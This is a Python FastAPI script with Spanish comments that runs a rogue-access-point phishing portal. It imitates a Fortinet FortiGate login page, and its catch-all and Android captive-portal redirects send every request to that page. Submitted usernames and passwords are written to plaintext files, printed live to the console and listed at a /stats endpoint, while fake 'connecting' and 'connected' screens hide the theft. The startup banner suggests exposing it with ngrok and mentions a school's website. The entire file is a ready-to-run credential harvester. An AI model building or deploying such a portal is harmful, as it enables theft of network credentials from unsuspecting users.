from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
import json
import uvicorn
from datetime import datetime, timezone
import asyncio

app = FastAPI()

# ===== CONFIGURACIÓN =====
# URL a la que se redirige después de una "conexión exitosa"
REDIRECT_URL = "https://www.msn.com/es-mx"

# ===== HTML FORTINET - PORTAL DE LOGIN =====
login_html = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FortiGate - Authentication Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #2c2c3e;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .fortinet-card {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        
        .fortinet-header {
            padding: 40px 30px 20px 30px;
            text-align: center;
        }
        
        .fortinet-logo {
            font-size: 32px;
            font-weight: 800;
            color: #e67e22;
            letter-spacing: 1px;
        }
        
        .fortinet-logo sup {
            font-size: 14px;
            font-weight: 500;
        }
        
        .fortinet-model {
            font-size: 12px;
            color: #999;
            letter-spacing: 1.5px;
            margin-top: 5px;
            font-weight: 500;
        }
        
        .fortinet-title {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-top: 25px;
            letter-spacing: 0.5px;
        }
        
        .fortinet-content {
            padding: 10px 30px 30px 30px;
        }
        
        .auth-text {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .auth-text p {
            color: #555;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: 22px;
        }
        
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #444;
            margin-bottom: 8px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            font-family: inherit;
            background: white;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #e67e22;
            box-shadow: 0 0 0 2px rgba(230,126,34,0.1);
        }
        
        .continue-btn {
            width: 100%;
            padding: 12px;
            background: #e67e22;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        
        .continue-btn:hover {
            background: #d35400;
        }
        
        .secure-text {
            text-align: center;
            font-size: 11px;
            color: #aaa;
            margin-top: 25px;
        }
        
        .fortinet-footer {
            background: #fafafa;
            padding: 15px 30px;
            text-align: center;
            border-top: 1px solid #eee;
        }
        
        .fortinet-footer p {
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="fortinet-card">
        <div class="fortinet-header">
            <div class="fortinet-logo">
                FORTINET<sup>®</sup>
            </div>
            <div class="fortinet-model">
                FortiGate
            </div>
            <div class="fortinet-title">
                Authentication Required
            </div>
        </div>
        
        <div class="fortinet-content">
            <div class="auth-text">
                <p>Please enter your credentials to continue.</p>
            </div>
            
            <form action="/login" method="post" id="loginForm">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" placeholder="" required autocomplete="off">
                </div>
                
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" placeholder="" required>
                </div>
                
                <button type="submit" class="continue-btn" id="submitBtn">Continue</button>
            </form>
            
            <div class="secure-text">
                Secure Authentication Required
            </div>
        </div>
        
        <div class="fortinet-footer">
            <p>© Fortinet Inc. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
"""

# ===== PANTALLA DE CONECTANDO =====
connecting_html = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="2; url=/success">
    <title>Connecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #2c2c3e;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .connecting-card {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            padding: 50px 30px;
            text-align: center;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #e67e22;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .connecting-card h3 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .connecting-card p {
            color: #666;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="connecting-card">
        <div class="spinner"></div>
        <h3>Connecting to network...</h3>
        <p>Authenticating 802.1X credentials</p>
        <p style="font-size: 11px; margin-top: 15px;">Please wait...</p>
    </div>
</body>
</html>
"""

# ===== PANTALLA DE ÉXITO =====
success_html = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3; url=""" + REDIRECT_URL + """">
    <title>Connected - FortiGate</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #2c2c3e;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .success-card {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            padding: 50px 30px;
            text-align: center;
        }
        
        .checkmark {
            width: 60px;
            height: 60px;
            background: #27ae60;
            border-radius: 50%;
            margin: 0 auto 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: scaleIn 0.5s ease-out;
        }
        
        .checkmark span {
            color: white;
            font-size: 35px;
            font-weight: bold;
        }
        
        @keyframes scaleIn {
            0% { transform: scale(0); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .success-card h3 {
            color: #27ae60;
            margin-bottom: 10px;
        }
        
        .success-card p {
            color: #666;
            font-size: 13px;
            margin: 10px 0;
        }
        
        .redirect-info {
            font-size: 11px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="success-card">
        <div class="checkmark">
            <span>✓</span>
        </div>
        <h3>Connected Successfully!</h3>
        <p>802.1X authentication completed.</p>
        <p>You now have access to the network.</p>
        <div class="redirect-info">
            Redirecting to portal in 3 seconds...
        </div>
    </div>
</body>
</html>
"""

def log_evidence(request: Request, username: str, password: str):
    """Registra evidencia de las credenciales capturadas"""
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")
    
    timestamp = datetime.now(timezone.utc)
    
    log_entry = {
        "timestamp": timestamp.isoformat(),
        "date": timestamp.strftime("%Y-%m-%d"),
        "time": timestamp.strftime("%H:%M:%S"),
        "src_ip": client_ip,
        "user_agent": user_agent,
        "username": username,
        "password": password,
        "portal_type": "Fortinet_802.1X",
        "status": "credentials_captured"
    }
    
    # Guardar en JSON
    with open("web_evidencia.json", "a") as log_file:
        log_file.write(json.dumps(log_entry) + "\n")
    
    # Guardar en TXT
    with open("credenciales_capturadas.txt", "a") as readable_log:
        readable_log.write(f"[{timestamp.strftime('%Y-%m-%d %H:%M:%S')}] IP: {client_ip} | User: {username} | Pass: {password}\n")
    
    # Mostrar en consola
    print("\n" + ""*40)
    print(" ¡CREDENCIALES CAPTURADAS EN TIEMPO REAL!")
    print(""*40)
    print(f" Portal: Fortinet 802.1X (Rogue AP)")
    print(f" IP Origen: {client_ip}")
    print(f" Usuario/Email: {username}")
    print(f" Contraseña: {password}")
    print(f" User-Agent: {user_agent[:70]}")
    print(f" Hora: {timestamp.strftime('%Y-%m-%d %H:%M:%S')}")
    print(""*40 + "\n")

@app.get("/", response_class=HTMLResponse)
async def get_portal():
    """Sirve el portal de login Fortinet"""
    return HTMLResponse(content=login_html)

@app.post("/login")
async def process_login(request: Request, username: str = Form(...), password: str = Form(...)):
    """Procesa el login, guarda credenciales y muestra pantalla de conexión"""
    # Registrar las credenciales
    log_evidence(request, username, password)
    
    # Mostrar pantalla de "Conectando..."
    return HTMLResponse(content=connecting_html)

@app.get("/success")
async def connection_success():
    """Muestra pantalla de éxito y redirige al sitio real"""
    return HTMLResponse(content=success_html)

@app.get("/stats")
async def get_stats():
    """Endpoint para ver estadísticas en tiempo real"""
    try:
        with open("credenciales_capturadas.txt", "r") as f:
            lines = f.readlines()
        
        # Obtener últimas 10 credenciales
        recent = []
        for line in lines[-10:]:
            recent.append(line.strip())
        
        return {
            "status": "ok",
            "total_credentials_captured": len(lines),
            "recent_credentials": recent
        }
    except FileNotFoundError:
        return {"status": "no_data", "total_credentials_captured": 0}

@app.get("/health")
async def health_check():
    """Health check para saber que el servicio está activo"""
    return {"status": "online", "service": "Fortinet Honeypot 802.1X"}

# ===== INTERCEPTADORES DE PORTAL CAUTIVO =====

@app.get("/generate_204")
async def captive_portal_check_android(request: Request):
    """Responde al detector de Android con un 302 hacia el portal"""
    return RedirectResponse(url="http://10.0.0.1/", status_code=302)

@app.get("/{path:path}")
async def catch_all(request: Request, path: str):
    """Atrapa cualquier otra URL de comprobación y la redirige al portal"""
    return RedirectResponse(url="http://10.0.0.1/", status_code=302)

if __name__ == "__main__":
    print("\n" + "="*60)
    print(" FORTINET HONEYPOT - ROGUE ACCESS POINT 802.1X")
    print("="*60)
    print(" Servidor local: http://localhost:8000")
    print(" Exponer con: ngrok http 8000")
    print("\n Logs guardados en:")
    print("   - web_evidencia.json (formato estructurado)")
    print("   - credenciales_capturadas.txt (formato legible)")
    print("\n Ver estadísticas: http://localhost:8000/stats")
    print("  Health check: http://localhost:8000/health")
    print("="*60)
    print("\n FLUJO QUE VERÁ EL USUARIO:")
    print("    Ve el portal FORTINET idéntico al real")
    print("    Ingresa usuario y contraseña")
    print("    Ve 'Connecting to network...'")
    print("    Ve 'Connected Successfully!'")
    print("    Es redirigido al sitio web real de la escuela")
    print("\n TÚ verás las credenciales AQUÍ en tiempo real")
    print("="*60 + "\n")
    
    uvicorn.run(app, host="0.0.0.0", port=8000)